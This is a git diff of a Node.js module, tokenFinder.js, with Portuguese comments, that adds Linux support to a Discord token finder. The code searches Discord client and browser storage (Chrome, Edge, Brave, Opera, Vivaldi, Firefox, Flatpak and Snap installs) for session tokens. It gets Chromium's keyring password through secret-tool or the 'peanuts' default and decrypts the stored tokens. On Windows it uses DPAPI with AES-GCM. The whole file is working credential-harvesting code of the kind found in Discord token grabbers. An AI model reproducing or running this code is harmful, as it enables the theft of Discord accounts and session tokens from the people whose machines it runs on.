@@ -1,19 +1,24 @@
 // src/services/tokenFinder.js - Busca automática de tokens do Discord
 //
+// Compatível com Windows e Linux (Arch Linux, Ubuntu, Fedora, etc.)
+//
 // Procura tokens do Discord nos seguintes locais:
 // 1. Discord Desktop (app instalado)
 // 2. Discord PTB (Public Test Build)
 // 3. Discord Canary
-// 4. Google Chrome
-// 5. Microsoft Edge
-// 6. Brave Browser
-// 7. Opera / Opera GX
-// 8. Vivaldi
-// 9. Firefox
+// 4. Discord via Flatpak / Snap (Linux)
+// 5. Google Chrome / Chromium
+// 6. Microsoft Edge
+// 7. Brave Browser
+// 8. Opera / Opera GX
+// 9. Vivaldi
+// 10. Firefox (perfis do Linux)
 //
 // Suporta dois formatos:
 // - Tokens em texto puro (regex nos ficheiros .ldb/.log)
-// - Tokens encriptados (prefixo dQw4w9WgXcQ:) desencriptados via DPAPI do Windows
+// - Tokens encriptados:
+//   - Windows: DPAPI (CryptUnprotectData) + AES-256-GCM
+//   - Linux: GNOME Keyring / secret-tool + AES-128-CBC (PBKDF2)
 
 const fs = require('fs');
 const path = require('path');
@@ -30,10 +35,21 @@ const PLAIN_TOKEN_PATTERNS = [
 // Padrão para tokens encriptados (Chromium DPAPI)
 const ENCRYPTED_TOKEN_PATTERN = /dQw4w9WgXcQ:([^\s"',;}{)\]]+)/g;
 
+const isLinux = process.platform === 'linux';
+const isWindows = process.platform === 'win32';
+
 /**
  * Retorna os caminhos onde o Discord/navegadores guardam dados.
+ * Suporta Windows e Linux (incluindo Arch Linux e outras distros).
  */
 function getSearchPaths() {
+  if (isLinux) {
+    return getLinuxSearchPaths();
+  }
+  return getWindowsSearchPaths();
+}
+
+function getWindowsSearchPaths() {
   const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
   const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');
 
@@ -88,27 +104,200 @@ function getSearchPaths() {
   ];
 }
 
-// ====================== DPAPI DECRYPTION (Windows) ======================
+function getLinuxSearchPaths() {
+  const home = os.homedir();
+  const configDir = process.env.XDG_CONFIG_HOME || path.join(home, '.config');
+
+  return [
+    // ===== Aplicações Discord (Linux) =====
+    {
+      name: 'Discord',
+      leveldb: path.join(configDir, 'discord', 'Local Storage', 'leveldb'),
+      localState: path.join(configDir, 'discord', 'Local State'),
+    },
+    {
+      name: 'Discord PTB',
+      leveldb: path.join(configDir, 'discordptb', 'Local Storage', 'leveldb'),
+      localState: path.join(configDir, 'discordptb', 'Local State'),
+    },
+    {
+      name: 'Discord Canary',
+      leveldb: path.join(configDir, 'discordcanary', 'Local Storage', 'leveldb'),
+      localState: path.join(configDir, 'discordcanary', 'Local State'),
+    },
+    // ===== Discord via Flatpak =====
+    {
+      name: 'Discord (Flatpak)',
+      leveldb: path.join(home, '.var', 'app', 'com.discordapp.Discord', 'config', 'discord', 'Local Storage', 'leveldb'),
+      localState: path.join(home, '.var', 'app', 'com.discordapp.Discord', 'config', 'discord', 'Local State'),
+    },
+    // ===== Discord via Snap =====
+    {
+      name: 'Discord (Snap)',
+      leveldb: path.join(home, 'snap', 'discord', 'current', '.config', 'discord', 'Local Storage', 'leveldb'),
+      localState: path.join(home, 'snap', 'discord', 'current', '.config', 'discord', 'Local State'),
+    },
+    // ===== Navegadores (Chromium-based - Linux) =====
+    {
+      name: 'Google Chrome',
+      leveldb: path.join(configDir, 'google-chrome', 'Default', 'Local Storage', 'leveldb'),
+      localState: path.join(configDir, 'google-chrome', 'Local State'),
+    },
+    {
+      name: 'Google Chrome (Flatpak)',
+      leveldb: path.join(home, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome', 'Default', 'Local Storage', 'leveldb'),
+      localState: path.join(home, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome', 'Local State'),
+    },
+    {
+      name: 'Chromium',
+      leveldb: path.join(configDir, 'chromium', 'Default', 'Local Storage', 'leveldb'),
+      localState: path.join(configDir, 'chromium', 'Local State'),
+    },
+    {
+      name: 'Microsoft Edge',
+      leveldb: path.join(configDir, 'microsoft-edge', 'Default', 'Local Storage', 'leveldb'),
+      localState: path.join(configDir, 'microsoft-edge', 'Local State'),
+    },
+    {
+      name: 'Brave',
+      leveldb: path.join(configDir, 'BraveSoftware', 'Brave-Browser', 'Default', 'Local Storage', 'leveldb'),
+      localState: path.join(configDir, 'BraveSoftware', 'Brave-Browser', 'Local State'),
+    },
+    {
+      name: 'Opera',
+      leveldb: path.join(configDir, 'opera', 'Local Storage', 'leveldb'),
+      localState: path.join(configDir, 'opera', 'Local State'),
+    },
+    {
+      name: 'Vivaldi',
+      leveldb: path.join(configDir, 'vivaldi', 'Default', 'Local Storage', 'leveldb'),
+      localState: path.join(configDir, 'vivaldi', 'Local State'),
+    },
+    // ===== Firefox (Linux) - usa perfis em profiles.ini =====
+    ...getFirefoxPaths(),
+  ];
+}
+
+/**
+ * Procura diretórios de perfil do Firefox no Linux.
+ * Firefox armazena tokens no localStorage do IndexedDB, não em LevelDB.
+ * Procuramos nos ficheiros de storage do webappsstore.
+ */
+function getFirefoxPaths() {
+  const home = os.homedir();
+  const firefoxDir = path.join(home, '.mozilla', 'firefox');
+
+  if (!fs.existsSync(firefoxDir)) return [];
+
+  const results = [];
+  try {
+    const entries = fs.readdirSync(firefoxDir);
+    for (const entry of entries) {
+      // Perfis do Firefox terminam em .default, .default-release, etc.
+      if (!entry.includes('.')) continue;
+      const profilePath = path.join(firefoxDir, entry);
+      const storagePath = path.join(profilePath, 'storage', 'default');
+      if (fs.existsSync(storagePath)) {
+        // Procurar pelo diretório do discord.com no storage do Firefox
+        try {
+          const storageDirs = fs.readdirSync(storagePath);
+          for (const dir of storageDirs) {
+            if (dir.includes('discord.com')) {
+              const lsDir = path.join(storagePath, dir, 'ls');
+              if (fs.existsSync(lsDir)) {
+                results.push({
+                  name: `Firefox (${entry})`,
+                  leveldb: lsDir,
+                  localState: null, // Firefox não usa Local State
+                });
+              }
+            }
+          }
+        } catch (_) {}
+      }
+    }
+  } catch (_) {}
+
+  return results;
+}
+
+// ====================== DECRYPTION (Windows DPAPI + Linux Keyring) ======================
 
 /**
  * Lê a chave mestre de encriptação do ficheiro "Local State" do Chromium.
- * A chave está encriptada com DPAPI do Windows.
+ * Windows: chave encriptada com DPAPI.
+ * Linux: chave derivada da password do keyring (GNOME Keyring / KWallet / secret-tool).
  */
 function getMasterKey(localStatePath) {
-  if (!fs.existsSync(localStatePath)) return null;
+  if (!localStatePath || !fs.existsSync(localStatePath)) return null;
 
   try {
     const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
     const encryptedKeyB64 = localState?.os_crypt?.encrypted_key;
 
-    if (!encryptedKeyB64) return null;
+    if (!encryptedKeyB64) {
+      // No Linux, se não há encrypted_key, tentar obter via keyring
+      if (isLinux) return getLinuxMasterKey();
+      return null;
+    }
 
     // Base64 decode -> remove prefixo "DPAPI" (5 bytes)
     const encryptedKey = Buffer.from(encryptedKeyB64, 'base64');
     const dpapiBlob = encryptedKey.slice(5);
 
-    // Desencriptar via DPAPI usando PowerShell
-    return dpapiDecrypt(dpapiBlob);
+    if (isWindows) {
+      return dpapiDecrypt(dpapiBlob);
+    }
+
+    if (isLinux) {
+      return getLinuxMasterKey();
+    }
+
+    return null;
+  } catch (_) {
+    return null;
+  }
+}
+
+/**
+ * Obtém a chave mestre do Chromium no Linux.
+ *
+ * No Linux, o Chromium usa uma password do keyring do sistema para derivar
+ * a chave de encriptação via PBKDF2. A password padrão é "peanuts" quando
+ * o keyring não está disponível, ou obtida via secret-tool do GNOME Keyring.
+ */
+function getLinuxMasterKey() {
+  // Tentar obter a password do GNOME Keyring via secret-tool
+  const passwords = [
+    getSecretToolPassword('chromium', 'Chrome Safe Storage'),
+    getSecretToolPassword('chrome', 'Chrome Safe Storage'),
+    'peanuts', // Password padrão quando keyring não está disponível
+  ];
+
+  for (const password of passwords) {
+    if (!password) continue;
+    try {
+      // Chromium no Linux usa PBKDF2 com a password do keyring
+      // Salt: "saltysalt", iterações: 1, keylen: 16 bytes, hash: sha1
+      const key = crypto.pbkdf2Sync(password, 'saltysalt', 1, 16, 'sha1');
+      return key;
+    } catch (_) {}
+  }
+
+  return null;
+}
+
+/**
+ * Tenta obter a password de encriptação do Chromium via secret-tool (libsecret).
+ * Funciona com GNOME Keyring, KDE KWallet (via libsecret bridge), etc.
+ */
+function getSecretToolPassword(application, label) {
+  try {
+    const result = execSync(
+      `secret-tool lookup application ${application} 2>/dev/null || secret-tool lookup xdg:schema chrome_libsecret_os_crypt_password_v2 application ${application} 2>/dev/null`,
+      { encoding: 'utf8', timeout: 5000 }
+    ).trim();
+    return result || null;
   } catch (_) {
     return null;
   }
@@ -149,10 +338,13 @@ function dpapiDecrypt(encryptedBuffer) {
 }
 
 /**
- * Desencripta um token encriptado com AES-256-GCM usando a chave mestre.
+ * Desencripta um token encriptado usando a chave mestre.
  *
- * Formato do blob encriptado:
- * [v10/v11 (3 bytes)] [IV (12 bytes)] [ciphertext + tag]
+ * Windows (AES-256-GCM):
+ *   [v10/v11 (3 bytes)] [IV (12 bytes)] [ciphertext + tag (16 bytes)]
+ *
+ * Linux (AES-128-CBC):
+ *   [v10/v11 (3 bytes)] [IV (16 bytes)] [ciphertext com padding PKCS7]
  */
 function decryptToken(encryptedTokenB64, masterKey) {
   try {
@@ -162,22 +354,49 @@ function decryptToken(encryptedTokenB64, masterKey) {
     const version = buf.slice(0, 3).toString();
     if (version !== 'v10' && version !== 'v11') return null;
 
-    // IV: bytes 3-15 (12 bytes)
-    const iv = buf.slice(3, 15);
+    if (isLinux) {
+      return decryptTokenLinux(buf, masterKey);
+    }
 
-    // Ciphertext + Auth Tag: bytes 15 até o final
-    // O Auth Tag do AES-GCM são os últimos 16 bytes
+    return decryptTokenWindows(buf, masterKey);
+  } catch (_) {
+    return null;
+  }
+}
+
+/**
+ * Desencripta token no Windows com AES-256-GCM.
+ */
+function decryptTokenWindows(buf, masterKey) {
+  try {
+    const iv = buf.slice(3, 15);
     const ciphertextWithTag = buf.slice(15);
     const authTag = ciphertextWithTag.slice(ciphertextWithTag.length - 16);
     const ciphertext = ciphertextWithTag.slice(0, ciphertextWithTag.length - 16);
 
-    // Desencripta com AES-256-GCM
     const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
     decipher.setAuthTag(authTag);
 
     let decrypted = decipher.update(ciphertext, null, 'utf8');
     decrypted += decipher.final('utf8');
+    return decrypted;
+  } catch (_) {
+    return null;
+  }
+}
 
+/**
+ * Desencripta token no Linux com AES-128-CBC (formato Chromium Linux).
+ */
+function decryptTokenLinux(buf, masterKey) {
+  try {
+    // No Linux, IV é de 16 bytes (espaço com valor 0x20 repetido)
+    const iv = Buffer.alloc(16, ' ');
+    const ciphertext = buf.slice(3);
+
+    const decipher = crypto.createDecipheriv('aes-128-cbc', masterKey, iv);
+    let decrypted = decipher.update(ciphertext, null, 'utf8');
+    decrypted += decipher.final('utf8');
     return decrypted;
   } catch (_) {
     return null;
@@ -198,7 +417,9 @@ function findTokensInDirectory(dirPath, masterKey) {
     const files = fs.readdirSync(dirPath);
 
     for (const file of files) {
-      if (!file.endsWith('.ldb') && !file.endsWith('.log')) continue;
+      // Aceitar .ldb, .log e ficheiros do Firefox (.sqlite, data sem extensão)
+      const validExt = file.endsWith('.ldb') || file.endsWith('.log') || file.endsWith('.sqlite');
+      if (!validExt && file.includes('.')) continue;
 
       const filePath = path.join(dirPath, file);
 
